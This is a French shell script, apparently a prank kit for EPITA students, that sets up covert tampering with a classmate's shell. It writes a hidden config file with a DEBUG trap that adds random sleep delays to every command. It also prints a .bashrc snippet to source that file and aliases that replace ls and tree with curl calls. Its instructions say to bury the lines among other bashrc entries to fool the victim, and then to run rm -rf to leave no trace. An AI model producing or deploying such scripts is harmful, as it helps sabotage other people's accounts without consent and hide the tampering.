#!/bin/sh

if [ "$#" -ne 3 ] && [ ! "$1" = "-e" ] ; then
    echo "./preparation [-r|-n|-e] {PATH} [FILENAME]"
    echo "-r : rm le dossier pour ne pas laisser de trace."
    echo "-n : Pour ne pas l'effacer, mauvaise idee."
    echo "-e : Pour mes gars d'EPITA pas besoin de PATH"
    echo "PATH : path du dossier config/ inutile si -e"
    echo "FILENAME : nom du fichier FILENAME.conf contenant la fonction"
    exit 1
fi

OPTION="$1"
CONFPATH="$2"
FILENAME="$3"

if [ "$OPTION" = "-e" ] ; then
    FILENAME=$2
    CONFPATH="afs/.confs/config"
fi

FILE="$CONFPATH/$FILENAME.conf"
BASHFILE="put_in_bashrc"

DELAYCODE='activate_delay() {
    trap '\''sleep $(awk "BEGIN{srand(); if (rand() < 0.5) {print 0} else if (rand() < 0.9) {print 1 + rand()} else {print 1 + rand()*3}}")'\'' DEBUG
}
PROMPT_COMMAND="${PROMPT_COMMAND:+$PROMPT_COMMAND; }activate_delay"'

IFBASH='if [ -d ~/.config ] ; then
    source '"~/$FILE"'
fi'

ALIAS="alias ls=\'curl ascii.live/nyan\'\nalias tree=\'curl ascii.live/donut\'\n"

# --- creer le fichier delay au bon endroit ---
if [ ! -e "$FILE" ] ; then
    touch "../$FILE"
    echo "$DELAYCODE" > "../$FILE"
fi

# --- creer la condition du bashrc pour lancer le fichier delay ---
if [ ! -e "$BASHFILE" ] ; then
    touch "$BASHFILE"
    echo "$IFBASH" > "$BASHFILE"
fi


echo ""
echo "_____________________________________________________"
echo ""
echo "Et mets la condition au milieu des autres conditions."
echo "Mets les alias tout en bas pour tromper le frero"
echo ""
echo "Copie la condition et les alias"
echo "Il faut les mettre dans le bashrc"
echo "_____________________________________________________"
echo ""
echo -ne "$ALIAS"
echo "_____________________________________________________"
echo ""
cat "$BASHFILE"
echo ""
echo ""


# --- pour effacer toutes traces de passage ---
if [ "$OPTION" = "-r" ] || [ "$OPTION" = "-e" ] ; then
    echo "cd ../"
    echo "rm -rf session_lagger"
    # cd "../"
    # rm -rf "session_lagger/"
else
    echo "C'est dangereux de pas tout effacer."
    echo "Relance avec -r."
fi
